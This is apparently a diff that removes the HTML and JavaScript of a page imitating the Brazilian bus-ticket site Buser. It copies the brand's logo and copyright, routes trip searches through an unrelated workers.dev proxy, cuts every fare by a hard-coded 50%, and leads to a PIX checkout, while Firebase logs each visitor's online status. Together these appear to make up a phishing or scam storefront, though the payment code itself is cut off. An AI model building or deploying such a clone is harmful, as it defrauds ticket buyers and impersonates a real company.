-  <div class="ms-background"><img src="https://bcdn.com.br/_nuxt3/poltronas.fWv4A4-_.webp" alt="Interior de um ônibus"></div>
-</div>
-
-<div class="container banners-home">
-  <div class="bh-promo"><div><h1>Viagens de ônibus mais baratas que a passagem da rodoviária</h1><p>Confira aqui nossas promoções e rotas com menores preços.</p></div><a href="#">QUERO PROMO →</a></div>
-  <div class="bh-card"><div><h2 style="color:#40b552;">Compre pelo Whatsapp</h2><p>Encontre a viagem ideal para você.</p><a href="#" style="color:#40b552;font-weight:600;">Reserve agora</a></div><img src="https://bcdn.com.br/_nuxt3/whatsapp.CVlL74hz.jpg" alt="WhatsApp" class="img-whats"></div>
-  <div class="bh-card"><div><h2 style="color:var(--brand);">Baixe o app da Buser</h2><p>É do app para a poltrona do ônibus: Sem burocracia e com segurança!</p></div><div class="stores"><img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="App Store"></div></div>
-</div>
-
-<div class="container destinos-procurados">
-  <h2>Destinos mais procurados</h2>
-  <section class="carousel dp-carousel"><ul>
-    <li><div class="dp-card"><h3>Ônibus para São Paulo</h3><div class="dp-row"><a href="#">Saindo do Rio de Janeiro</a><span>R$ 93,90</span></div><div class="dp-row"><a href="#">Saindo de Belo Horizonte</a><span>R$ 100,75</span></div><a href="#" style="color:var(--brand);font-weight:600;display:block;text-align:right;margin-top:16px;">Ver mais ônibus</a></div></li>
-    <li><div class="dp-card"><h3>Ônibus para Rio de Janeiro</h3><div class="dp-row"><a href="#">Saindo de São Paulo</a><span>R$ 88,02</span></div><div class="dp-row"><a href="#">Saindo de Belo Horizonte</a><span>R$ 62,90</span></div><a href="#" style="color:var(--brand);font-weight:600;display:block;text-align:right;margin-top:16px;">Ver mais ônibus</a></div></li>
-    <li><div class="dp-card"><h3>Ônibus para Belo Horizonte</h3><div class="dp-row"><a href="#">Saindo do Rio de Janeiro</a><span>R$ 62,90</span></div><div class="dp-row"><a href="#">Saindo de São Paulo</a><span>R$ 82,90</span></div><a href="#" style="color:var(--brand);font-weight:600;display:block;text-align:right;margin-top:16px;">Ver mais ônibus</a></div></li>
-  </ul></section>
-</div>
-
-<div class="container sobre-buser">
-  <div class="ac-titulo"><p style="color:var(--brand);font-weight:600;">Viaje com praticidade, segurança e preço justo.</p><h2>Buser é tudo o que você precisa para viajar de ônibus</h2></div>
-  <div class="sobre-container"><img src="https://bcdn.com.br/_nuxt3/foto-busao-rosa.B2KzL8f9.png" alt="Passageiro"><button class="sci-btn">▶</button></div>
-  <div class="mpv-motivos">
-    <div class="mpv-item"><span class="icon">✌️</span><h3>Viaje do seu jeito</h3><p>Aqui quem faz o seu caminho, é você.</p></div>
-    <div class="mpv-item"><span class="icon">⏱️</span><h3>Cancelamento gratuito</h3><p>No seu caminho, você que manda.</p></div>
-    <div class="mpv-item"><span class="icon">🎧</span><h3>Suporte 24 horas por dia</h3><p>Antes, durante e após a viagem.</p></div>
-  </div>
-</div>
-
-<div class="container" style="padding-inline:0">
-  <div class="seguranca-section">
-    <div class="ss-container">
-      <div class="ssc-image"><img src="https://bcdn.com.br/_nuxt3/banner-seguranca.L6_9exp4.webp" alt="Segurança"></div>
-      <div class="ssc-content"><h2>Segurança pra você trilhar o seu caminho</h2><p>Os parceiros da Buser têm câmera anti-fadiga com reconhecimento facial e acompanhamento por telemetria.</p><a href="#" class="btn-white">Viaje com a Buser →</a></div>
-    </div>
-  </div>
-</div>
-
-<footer class="footer">
-  <div class="container">
-    <section class="f-social-brand">
-      <svg class="logo" viewBox="0 0 122 24" style="color:var(--brand);fill:var(--brand);" xmlns="http://www.w3.org/2000/svg"><path d="M15.6299 11.9915C14.6646 10.4937 13.7047 9.0067 12.7394 7.51022C12.765 7.48173 12.7892 7.45324 12.8162 7.42746C13.4153 6.84813 14.0817 6.36242 14.8127 5.9649C15.6353 5.51717 16.505 5.19834 17.4204 5.00975C17.9482 4.90121 18.4813 4.83745 19.0198 4.82523C21.3529 4.77368 23.4423 5.46833 25.2571 6.94717C26.8901 8.27678 27.9537 9.98627 28.4814 12.0336C28.6039 12.5071 28.6807 12.9887 28.7265 13.4772C28.7776 14.0253 28.7843 14.5734 28.7386 15.1202C28.5757 17.0549 27.9106 18.7956 26.7084 20.3165C25.4281 21.9351 23.7883 23.0177 21.8133 23.5808C21.3219 23.7205 20.8225 23.8128 20.3149 23.8671C19.7683 23.9268 19.2218 23.9417 18.6738 23.9023C17.1189 23.7897 15.6703 23.3312 14.3415 22.5063C13.1164 21.7465 12.1228 20.7479 11.3393 19.5323C9.38451 16.4959 7.42703 13.4609 5.47089 10.4245C4.11519 8.32698 2.76219 6.22539 1.40649 4.12516C1.1655 3.75205 1.00934 3.3491 0.974333 2.90409C0.921828 2.22572 1.0955 1.60976 1.50746 1.06707C1.91269 0.533871 2.44985 0.20554 3.10683 0.122779C4.19193 -0.0128944 5.0697 0.372419 5.67687 1.29364C6.4806 2.50793 7.25471 3.73849 8.04228 4.95955C9.92706 7.88332 11.8145 10.8071 13.7007 13.7295C14.3509 14.7376 15.0012 15.7443 15.6555 16.7496C16.3259 17.7821 17.2602 18.4469 18.4598 18.6857C19.9393 18.9801 21.2425 18.5853 22.3411 17.5447C23.0209 16.9002 23.4369 16.0984 23.6052 15.1744C24.0293 12.8517 22.5969 10.6646 20.3863 10.1043C19.9016 9.98084 19.4089 9.932 18.9121 9.98627C17.5524 10.1355 16.4753 10.7745 15.6918 11.9088C15.6797 11.9264 15.6689 11.944 15.6568 11.9603C15.6514 11.9671 15.6474 11.9712 15.6299 11.9915Z" fill="currentColor"></path></svg>
-      <div class="fe-social"><span>📷</span><span>📘</span><span>🐦</span><span>💼</span><span>🎵</span></div>
-    </section>
-    <span class="ada-divider"></span>
-    <div class="f-links">
-      <div><span>Destinos</span><a href="#">Rio → São Paulo</a><a href="#">São Paulo → Rio</a></div>
-      <div><span>Viagem</span><a href="#">Buser Carro</a><a href="#">Empresas</a></div>
-      <div><span>Sobre</span><a href="#">Ajuda</a><a href="#">Imprensa</a></div>
-    </div>
-    <span class="ada-divider"></span>
-    <div class="fe-copyright">© 2026 Copyright - Todos os direitos reservados. Buser Brasil Tecnologia LTDA</div>
-  </div>
-</footer>
-
-<nav class="ada-nav-bottom">
-  <a href="#" class="nb-item active"><i>🏠</i> Início</a>
-  <a href="#" class="nb-item"><i>🎟️</i> Experiências</a>
-  <a href="#" class="nb-item"><i>🚌</i> Viagens</a>
-  <a href="#" class="nb-item"><i>❓</i> Ajuda</a>
-  <a href="#" class="nb-item"><i>👤</i> Perfil</a>
-</nav>
-
-<div id="modal-passageiros" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:1002;align-items:center;justify-content:center;">
-  <div class="buser-modal" style="max-width:600px;">
-    <div class="bm-header"><h2>Quem vai viajar?</h2></div>
-    <div class="bm-content">
-      <div id="lista-passageiros"></div>
-      <button onclick="adicionarPassageiro()" style="width:100%;padding:12px;border:1px dashed var(--brand);background:transparent;color:var(--brand);border-radius:8px;cursor:pointer;margin-bottom:16px;font-weight:600;">+ Adicionar passageiro</button>
-      <div style="border-top:1px solid #eee;padding-top:16px;margin-top:16px;"><p style="font-size:16px;font-weight:600;">Total: <span id="valor-total" style="color:var(--brand);">R$ 0,00</span></p></div>
-      <div style="display:flex;gap:8px;margin-top:16px;">
-        <button onclick="fecharModalPassageiros()" style="flex:1;padding:12px;border:1px solid #ddd;background:#fff;border-radius:8px;cursor:pointer;">Cancelar</button>
-        <button onclick="confirmarPassageiros()" style="flex:1;padding:12px;border:none;background:var(--brand);color:#fff;border-radius:8px;font-weight:700;cursor:pointer;">Continuar</button>
-      </div>
-    </div>
-  </div>
-</div>
-
-<div id="modal-poltrona" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:1001;align-items:center;justify-content:center;">
-  <div class="buser-modal">
-    <div class="bm-header"><h2>Escolha sua Poltrona</h2></div>
-    <div class="bm-content">
-      <div id="poltrona-fonte" style="font-size:11px;color:var(--grey-med);margin:0 0 12px;"></div>
-      <div id="mapa-onibus" style="margin-bottom:20px;"></div>
-      <div style="display:flex;gap:8px;">
-        <button onclick="fecharModalPoltrona()" style="flex:1;padding:12px;border:1px solid #ddd;background:#fff;border-radius:8px;cursor:pointer;">Cancelar</button>
-        <button onclick="confirmarPoltrona()" style="flex:1;padding:12px;border:none;background:var(--brand);color:#fff;border-radius:8px;font-weight:700;cursor:pointer;">Confirmar</button>
-      </div>
-    </div>
-  </div>
-</div>
-
-<div id="modal-checkout" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:1000;align-items:center;justify-content:center;">
-  <div class="buser-modal">
-    <div class="bm-header">
-      <a href="#" onclick="fecharCheckout(); return false;" style="position:absolute;left:16px;font-size:20px;color:#333;">←</a>
-      <h2>Finalizar Reserva</h2>
-    </div>
-    <div class="bm-content">
-      <div id="checkout-info" style="font-size:14px;line-height:1.6;margin-bottom:24px;"></div>
-      <div id="area-pix" style="display:block;"></div>
-    </div>
-  </div>
-</div>
-
-<div id="modal-passagem" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:1003;align-items:center;justify-content:center;">
-  <div class="buser-modal">
-    <div class="bm-header">
-      <a href="#" onclick="fecharPassagem(); return false;" style="position:absolute;left:16px;font-size:20px;color:#333;">←</a>
-      <h2>Detalhes da reserva</h2>
-    </div>
-    <div class="bm-content" id="passagem-content"></div>
-    <div style="padding:16px; background:#fff; border-top:1px solid #eee; text-align:center;">
-      <p style="font-size:12px; color:#757575; margin:0;">A Buser foi indicada como melhor atendimento ao cliente do Brasil</p>
-    </div>
-  </div>
-</div>
-
-<!-- BOTÃO FLUTUANTE WHATSAPP -->
-<button class="whatsapp-float" onclick="abrirWhatsApp()" aria-label="Fale com a gente no WhatsApp">
-  <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-    <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51a12.8 12.8 0 0 0-.57-.01c-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.71.306 1.263.489 1.694.626.712.226 1.36.194 1.872.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.29.173-1.414-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 0 1-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 0 1-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 0 1 2.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0 0 12.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 0 0 5.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 0 0-3.48-8.413Z"/>
-  </svg>
-</button>
-
-<script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
-<script src="https://cdn.jsdelivr.net/npm/flatpickr/dist/l10n/pt.js"></script>
-
-<script>
-  // ============================================================
-  // FIREBASE (PIX config)
-  // ============================================================
-  const firebaseConfig = {
-    apiKey: "AIzaSyCmoxq5NMQUj1hqyWhjaJz4Uw4grhsFFhA",
-    authDomain: "projeto-link-ddbf0.firebaseapp.com",
-    databaseURL: "https://projeto-link-ddbf0-default-rtdb.firebaseio.com",
-    projectId: "projeto-link-ddbf0",
-    storageBucket: "projeto-link-ddbf0.firebasestorage.app",
-    messagingSenderId: "560317126646",
-    appId: "1:560317126646:web:be9cad9c9ed350940399d7"
-  };
-  let db = null;
-  try {
-    firebase.initializeApp(firebaseConfig);
-    db = firebase.database();
-  } catch (e) {
-    console.warn('Firebase não inicializou:', e);
-  }
-
-  function getClienteId() {
-    let id = localStorage.getItem('buser_cliente_id');
-    if (!id) {
-      id = 'anon_' + Math.random().toString(36).slice(2, 10) + Date.now().toString(36).slice(-4);
-      localStorage.setItem('buser_cliente_id', id);
-    }
-    return id;
-  }
-
-  if (db) {
-    const clienteId = getClienteId();
-    const marcarOnline = () => {
-      db.ref('buser_visitas/' + clienteId).update({ ultimaAtividade: firebase.database.ServerValue.TIMESTAMP, online: true }).catch(() => {});
-    };
-
-    marcarOnline();
-    db.ref('buser_visitas/' + clienteId + '/primeiraVisita').transaction(val => val || Date.now());
-    
-    window.addEventListener('beforeunload', () => { db.ref('buser_visitas/' + clienteId + '/online').set(false).catch(() => {}); });
-    setInterval(marcarOnline, 20000);
-  }
-
-  flatpickr("#input-ida", { locale: "pt", dateFormat: "Y-m-d", altInput: true, altFormat: "d/m/Y", minDate: "today" });
-
-  // ============================================================
-  // UTILITÁRIOS DE NORMALIZAÇÃO
-  // ============================================================
-  function normalizarTexto(t) {
-    if (!t) return '';
-    return String(t).normalize('NFD').replace(/[\u0300-\u036f]/g, "").toLowerCase();
-  }
-
-  function safeString(val, fallback = '') {
-    if (val === undefined || val === null) return fallback;
-    if (typeof val === 'string') return val.trim();
-    if (typeof val === 'number') return String(val);
-    if (typeof val === 'object') {
-      const inner = val.name || val.nome || val.companyName || val.nomeFantasia || val.razaoSocial || val.brand || val.displayName || val.display || val.label || val.title || val.value;
-      if (inner) return safeString(inner, fallback);
-    }
-    return fallback;
-  }
-
-  function isValidUrl(str) {
-    if (!str || typeof str !== 'string') return false;
-    try { new URL(str); return true; } catch { return false; }
-  }
-
-  function extrairCidade(t) {
-    if (!t || typeof t !== 'object') return '';
-    return safeString(t.city || t.cidade || t.city_name || t.cityName || t.municipio || t.location?.city, '');
-  }
-
-  function extrairNomeEmpresa(v) {
-    if (!v) return 'Viação';
-    if (typeof v.company === 'string') return v.company;
-    if (typeof v.empresa === 'string') return v.empresa;
-    const cands = [
-      v.travelCompany, v.travelCompany?.name,
-      v.company, v.companyName, v.company_name, v.busCompany, v.bus_company,
-      v.empresa, v.operator, v.transportadora, v.carrier, v.viacao, v.viação,
-      v.bus?.company, v.bus?.empresa, v.trip?.company, v.trip?.empresa,
-      v.bus_company_name, v.carrier_name, v.operator_name
-    ];
-    for (const c of cands) {
-      const s = safeString(c, '');
-      if (s && s !== '[object Object]' && s !== 'undefined' && s !== 'null') return s;
-    }
-    return 'Viação Parceira';
-  }
-
-  function extrairLogoEmpresa(v) {
-    if (!v) return '';
-    const cands = [
-      v.travelCompany?.logo,
-      v.company?.logo, v.company?.logoUrl, v.company?.logo_url,
-      v.company?.image, v.company?.imageUrl, v.company?.imagem,
-      v.companyLogo, v.company_logo, v.companyLogoUrl,
-      v.logo, v.logoUrl, v.logo_url, v.image, v.imageUrl,
-      v.busCompany?.logo, v.empresa?.logo, v.bus?.company?.logo
-    ];
-    for (const c of cands) {
-      const s = safeString(c, '');
-      if (s && isValidUrl(s)) return s;
-    }
-    return '';
-  }
-
-  function formatarTerminalExibicao(cidade, terminalName) {
-    const cidadeLimpa = safeString(cidade, '').split(',')[0].trim();
-    const terminalLimpo = safeString(terminalName, '').trim();
-
-    if (!terminalLimpo || terminalLimpo.toLowerCase() === 'origem' || terminalLimpo.toLowerCase() === 'destino' || terminalLimpo.toLowerCase() === 'null' || terminalLimpo.toLowerCase() === 'undefined') {
-      return cidadeLimpa || terminalLimpo || 'Terminal';
-    }
-    if (!cidadeLimpa) return terminalLimpo;
-
-    if (normalizarTexto(terminalLimpo).includes(normalizarTexto(cidadeLimpa))) {
-      return terminalLimpo;
-    }
-    return `${cidadeLimpa} - ${terminalLimpo}`;
-  }
-
-  function extrairArray(json) {
-    if (Array.isArray(json)) return json;
-    if (!json || typeof json !== 'object') return [];
-    if (json.data && Array.isArray(json.data.data)) return json.data.data;
-    return json.data || json.viagens || json.results || json.trips || json.items || [];
-  }
-
-  function normalizarViagem(v) {
-    const depTerm = v.departure?.place || v.departure?.terminal || v.departure?.location || v.origin || v.origem || {};
-    const arrTerm = v.arrival?.place   || v.arrival?.terminal   || v.arrival?.location   || v.destination || v.destino || {};
-
-    const depCity = safeString(extrairCidade(depTerm) || v.departure?.city || v.origem_cidade || v.origin_city || window.__buscaCidadeOrigem, '');
-    const arrCity = safeString(extrairCidade(arrTerm) || v.arrival?.city   || v.destino_cidade || v.destination_city || window.__buscaCidadeDestino, '');
-
-    const depTermName = safeString(depTerm.name || depTerm.nome || v.departure?.terminalName || v.departure?.terminal_name || v.origem_terminal, '');
-    const arrTermName = safeString(arrTerm.name || arrTerm.nome || v.arrival?.terminalName || v.arrival?.terminal_name || v.destino_terminal, '');
-
-    return {
-      company: {
-        name: extrairNomeEmpresa(v),
-        logo: extrairLogoEmpresa(v)
-      },
-      bus_type: safeString(v.bus_type || v.busType || v.tipo || v.service_class || v.serviceClass || v.categoria, 'Convencional'),
-      price: Number(
-        (v.price && typeof v.price === 'object' ? v.price.value : v.price) ??
-        v.preco ?? v.valor ?? v.amount ?? 0
-      ),
-      total_seats: v.total_seats || v.totalSeats || v.assentos || v.seats || 46,
-      occupied_seats: v.occupied_seats || v.occupiedSeats || v.assentos_ocupados || [],
-      departure: {
-        time: safeString(v.departure?.time || v.departureTime || v.departure_time || v.horario_saida || v.saida, '--:--'),
-        city: depCity,
-        terminal: {
-          name:    depTermName,
-          address: safeString(depTerm.address || depTerm.endereco || v.departure?.terminalAddress || v.departure?.terminal_address || v.origem_endereco, ''),
-          city: depCity
-        }
-      },
-      arrival: {
-        time: safeString(v.arrival?.time || v.arrivalTime || v.arrival_time || v.horario_chegada || v.chegada, '--:--'),
-        city: arrCity,
-        terminal: {
-          name:    arrTermName,
-          address: safeString(arrTerm.address || arrTerm.endereco || v.arrival?.terminalAddress || v.arrival?.terminal_address || v.destino_endereco, ''),
-          city: arrCity
-        }
-      }
-    };
-  }
-
-  // ============================================================
-  // IBGE / AUTOCOMPLETE
-  // ============================================================
-  let cidadesBrasil = [];
-  const cidadesFallback = [
-    "São Paulo, SP", "Rio de Janeiro, RJ", "Belo Horizonte, MG", "Brasília, DF", "Salvador, BA",
-    "Fortaleza, CE", "Recife, PE", "Porto Alegre, RS", "Curitiba, PR", "Manaus, AM",
-    "Belém, PA", "Goiânia, GO", "Campinas, SP", "São Luís, MA", "Maceió, AL",
-    "Natal, RN", "Teresina, PI", "Campo Grande, MS", "João Pessoa, PB", "Aracaju, SE",
-    "Cuiabá, MT", "Florianópolis, SC", "Vitória, ES", "Porto Velho, RO", "Macapá, AP",
-    "Rio Branco, AC", "Boa Vista, RR", "Palmas, TO", "Guarulhos, SP", "Osasco, SP"
-  ];
-
-  async function carregarCidadesIBGE() {
-    const cache = localStorage.getItem('buser_cidades_ibge_v1');
-    if (cache) { cidadesBrasil = JSON.parse(cache); return; }
-    cidadesBrasil = [...cidadesFallback];
-    try {
-      const ctrl = new AbortController();
-      const timer = setTimeout(() => ctrl.abort(), 8000);
-      const response = await fetch('https://servicodados.ibge.gov.br/api/v1/localidades/municipios', { signal: ctrl.signal });
-      clearTimeout(timer);
-      const dados = await response.json();
-      cidadesBrasil = dados.map(c => {
-        const uf = c['regiao-imediata']?.['regiao-intermediaria']?.UF?.sigla || c.microrregiao?.mesorregiao?.UF?.sigla || 'BR';
-        return `${c.nome}, ${uf}`;
-      }).sort();
-      localStorage.setItem('buser_cidades_ibge_v1', JSON.stringify(cidadesBrasil));
-    } catch (e) { console.log("⚠️ IBGE falhou. Usando fallback."); }
-  }
-  carregarCidadesIBGE();
-
-  function configurarAutocomplete(inputId, listaId) {
-    const input = document.getElementById(inputId);
-    const lista = document.getElementById(listaId);
-    input.addEventListener('input', function () {
-      const termo = normalizarTexto(this.value);
-      lista.innerHTML = '';
-      if (termo.length < 2) { lista.style.display = 'none'; return; }
-      const filtradas = cidadesBrasil.filter(c => normalizarTexto(c).includes(termo)).slice(0, 10);
-      if (filtradas.length > 0) {
-        lista.style.display = 'block';
-        filtradas.forEach(cidade => {
-          const li = document.createElement('li');
-          li.textContent = cidade;
-          li.onmousedown = function (e) {
-            e.preventDefault();
-            input.value = cidade;
-            lista.style.display = 'none';
-            if (inputId === 'input-origem') document.getElementById('input-destino').focus();
-          };
-          lista.appendChild(li);
-        });
-      } else { lista.style.display = 'none'; }
-    });
-  }
-  configurarAutocomplete('input-origem', 'lista-origem');
-  configurarAutocomplete('input-destino', 'lista-destino');
-
-  function swapCidades() {
-    const o = document.getElementById('input-origem'), d = document.getElementById('input-destino');
-    const t = o.value; o.value = d.value; d.value = t;
-  }
-
-  // ============================================================
-  // BUSCA (FLUXO DE FILA COM POLLING INTELIGENTE)
-  // ============================================================
-  let viagensOriginais = [];
-
-  document.getElementById('btn-pesquisar').addEventListener('click', async function () {
-    let origem = document.getElementById('input-origem').value.trim();
-    let destino = document.getElementById('input-destino').value.trim();
-    const dataIda = document.getElementById('input-ida').value;
-
-    if (!origem || !destino || !dataIda) { alert("Preencha origem, destino e data."); return; }
-    if (!origem.includes(',')) {
-      const b = cidadesBrasil.find(c => normalizarTexto(c).startsWith(normalizarTexto(origem)));
-      if (b) origem = b; else { alert("Origem não encontrada."); return; }
-    }
-    if (!destino.includes(',')) {
-      const b = cidadesBrasil.find(c => normalizarTexto(c).startsWith(normalizarTexto(destino)));
-      if (b) destino = b; else { alert("Destino não encontrado."); return; }
-    }
-
-    window.__buscaCidadeOrigem  = origem.split(',')[0].trim();
-    window.__buscaCidadeDestino = destino.split(',')[0].trim();
-
-    const container = document.getElementById('resultados-viagem');
-    const lista = document.getElementById('lista-viagens');
-    container.style.display = 'block';
-    document.getElementById('titulo-resultados').innerHTML = `Resultados de ${origem} para ${destino}`;
-    lista.innerHTML = `<div style="text-align:center;padding:40px;"><div style="margin:0 auto 16px;border:3px solid #eee;border-top-color:var(--brand);border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;"></div><p style="color:var(--grey-med);">Enviando pedido...</p></div>`;
-
-    const apiUrl = `https://proxy-buser.vendasi693.workers.dev/api/clickbus/search?origem=${encodeURIComponent(origem)}&destino=${encodeURIComponent(destino)}&data=${dataIda}`;
-
-    try {
-      const resBusca = await fetch(apiUrl);
-      const dataBusca = await resBusca.json();
-
-      if (!dataBusca.pedidoId) {
-        throw new Error('Servidor não retornou um ID de pedido.');
-      }
-
-      consultarResultado(dataBusca.pedidoId, lista);
-
-    } catch (error) {
-      console.error('❌ ERRO NA BUSCA:', error);
-      lista.innerHTML = `<div style="text-align:center;padding:24px;background:#fff7fa;border-radius:16px;border:1px solid #ffccd5;"><p style="color:#d81b60;font-weight:700;">Sem viagens no momento.</p><p style="font-size:12px;color:#888;margin:4px 0 12px;">${error.message || 'Erro desconhecido'}</p><button onclick="usarViagensDemo()" style="margin-top:12px;padding:12px 20px;background:var(--brand);color:#fff;border:none;border-radius:8px;font-weight:700;cursor:pointer;">🎮 Ver Demonstração</button></div>`;
-    }
-  });
-
-  async function consultarResultado(pedidoId, lista) {
-    const urlResultado = `https://proxy-buser.vendasi693.workers.dev/api/clickbus/resultado/${pedidoId}`;
-    let tentativas = 0;
-    const maxTentativas = 60;
-
-    const intervalId = setInterval(async () => {
-        tentativas++;
-
-        if (tentativas > maxTentativas) {
-            clearInterval(intervalId);
-            lista.innerHTML = `<p style="color:red; text-align:center; padding: 20px;">A busca demorou muito. Tente novamente.</p>`;
-            return;
-        }
-
-        try {
-            const res = await fetch(urlResultado);
-            const data = await res.json();
-
-            if (data.status === 'processando') {
-                lista.innerHTML = `<div style="text-align:center;padding:40px;"><div style="margin:0 auto 16px;border:3px solid #eee;border-top-color:var(--brand);border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;"></div><p style="color:var(--grey-med);">Buscando as melhores viagens... (${tentativas}s)</p></div>`;
-                return;
-            }
-
-            clearInterval(intervalId);
-
-            if (data.status === 'concluido') {
-                if (data.data && data.data.length > 0) {
-                    viagensOriginais = data.data.map(normalizarViagem);
-                    renderizarViagens(viagensOriginais);
-                } else {
-                    lista.innerHTML = `<p style="text-align:center; padding: 20px;">Nenhuma viagem encontrada para esta data.</p>`;
-                }
-            } else {
-                lista.innerHTML = `<p style="text-align:center; padding: 20px;">Erro na busca: ${data.message || 'Erro desconhecido'}</p>`;
-            }
-
-        } catch (error) {
-            clearInterval(intervalId);
-            console.error('❌ ERRO AO CONSULTAR RESULTADO:', error);
-            lista.innerHTML = `<p style="text-align:center; padding: 20px;">Erro ao consultar resultado. Verifique sua conexão.</p>`;
-        }
-    }, 1000);
-  }
-
-  function usarViagensDemo() {
-    viagensOriginais = [
-      {
-        company: { name: 'Catedral', logo: '' },
-        bus_type: 'Executivo',
-        departure: {
-          time: '08:00', city: 'São Paulo',
-          terminal: { name: 'Rodoviária do Tietê', address: 'Av. Cruzeiro do Sul, 1800 - Santana', city: 'São Paulo' }
-        },
-        arrival: {
-          time: '14:15', city: 'Salvador',
-          terminal: { name: 'Terminal Rodoviário de Salvador', address: 'Av. Antônio Carlos Magalhães, 4362', city: 'Salvador' }
-        },
-        price: 250.00, total_seats: 46,
-        occupied_seats: [2, 5, 8, 12, 15, 22, 28, 33, 40]
-      },
-      {
-        company: { name: 'Nacional', logo: '' },
-        bus_type: 'Convencional',
-        departure: {
-          time: '14:00', city: 'São Paulo',
-          terminal: { name: 'Rodoviária do Tietê', address: 'Av. Cruzeiro do Sul, 1800 - Santana', city: 'São Paulo' }
-        },
-        arrival: {
-          time: '19:45', city: 'Salvador',
-          terminal: { name: 'Terminal Rodoviário de Salvador', address: 'Av. Antônio Carlos Magalhães, 4362', city: 'Salvador' }
-        },
-        price: 288.87, total_seats: 32,
-        occupied_seats: [3, 7, 11, 19, 25]
-      }
-    ];
-    renderizarViagens(viagensOriginais);
-    document.getElementById('lista-viagens').insertAdjacentHTML('afterbegin', `<div style="background:#fff8e1;padding:12px;border-radius:8px;border:1px solid #ffe082;margin-bottom:16px;font-size:13px;color:#7a5c00;">🎮 Modo demonstração.</div>`);
-  }
-
-  function renderizarViagens(viagens) {
-    const lista = document.getElementById('lista-viagens');
-    
-    const LOGOS_EMPRESAS = {
-      'Catedral': 'https://upload.wikimedia.org/wikipedia/commons/thumb/1/1e/Catedral_logo.png/200px-Catedral_logo.png',
-      'Nacional': 'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/Nacional_logo.png/200px-Nacional_logo.png',
-      'Gontijo': 'https://upload.wikimedia.org/wikipedia/commons/thumb/1/1b/Gontijo_logo.png/200px-Gontijo_logo.png',
-      'Expresso do Sul': 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/Expresso_do_Sul_logo.png/200px-Expresso_do_Sul_logo.png',
-    };
-
-    lista.innerHTML = viagens.map((v, i) => {
-      const precoOriginal = parseFloat(v.price) || 0;
-      const precoFinal = precoOriginal * 0.5;
-      const tP = v.departure.terminal;
-      const tC = v.arrival.terminal;
-
-      const termSaida = formatarTerminalExibicao(v.departure.city, tP.name);
-      const termChegada = formatarTerminalExibicao(v.arrival.city, tC.name);
-
-      const nomeEmpresa = v.company.name;
-      const logoUrl = v.company.logo || LOGOS_EMPRESAS[nomeEmpresa] || '';
-
-      const logoHtml = logoUrl
-        ? `<img src="${logoUrl}" alt="${nomeEmpresa}" class="company-logo" onerror="this.style.display='none'">`
-        : `<span style="font-size:20px; margin-right:4px;">🚌</span>`;
-
-      return `
-      <div class="trip-card">
-        <div style="flex:1; min-width:0;">
-          <h4 style="display:flex; align-items:center; gap:8px; flex-wrap:wrap;">
-            ${logoHtml}
-            <span>${nomeEmpresa}</span>
-            <span style="background:var(--brand); color:#fff; padding:2px 8px; border-radius:4px; font-size:11px;">${v.bus_type}</span>
-          </h4>
-          <div style="display:flex; gap:24px; margin-top:12px; flex-wrap:wrap;">
-            <div style="flex:1; min-width:140px;">
-              <span style="color:var(--grey-med); font-size:12px; display:block;">Saída</span>
-              <strong style="font-size:16px;">${v.departure.time}</strong>
-              <span style="display:block; font-size:12px; color:#333; font-weight:500; margin-top:4px;">${termSaida}</span>
-              ${tP.address ? `<span class="terminal-address"><i>📍</i>${tP.address}</span>` : ''}
-            </div>
-            <div style="border-left:2px dashed var(--grey-light); padding-left:24px; flex:1; min-width:140px;">
-              <span style="color:var(--grey-med); font-size:12px; display:block;">Chegada</span>
-              <strong style="font-size:16px;">${v.arrival.time}</strong>
-              <span style="display:block; font-size:12px; color:#333; font-weight:500; margin-top:4px;">${termChegada}</span>
-              ${tC.address ? `<span class="terminal-address"><i>📍</i>${tC.address}</span>` : ''}
-            </div>
-          </div>
-        </div>
-        <div class="trip-price">
-          <span style="font-size:12px; color:var(--grey-med); display:block;">A partir de</span>
-          <div class="preco-antigo">R$ ${precoOriginal.toFixed(2).replace('.', ',')}</div>
-          <div style="display:flex; align-items:center; justify-content:flex-end; gap:6px;">
-            <span>R$ ${precoFinal.toFixed(2).replace('.', ',')}</span>
-            <span class="desconto-badge">-50%</span>
-          </div>
-          <button onclick="selecionarViagem(${i})" style="background:var(--brand); color:#fff; border:none; padding:12px 24px; border-radius:8px; font-weight:700; cursor:pointer; margin-top:8px; width:100%;">Selecionar</button>
-        </div>
-      </div>`;
-    }).join('');
-  }
-
-  // ============================================================
-  // FLUXO DE COMPRA
-  // ============================================================
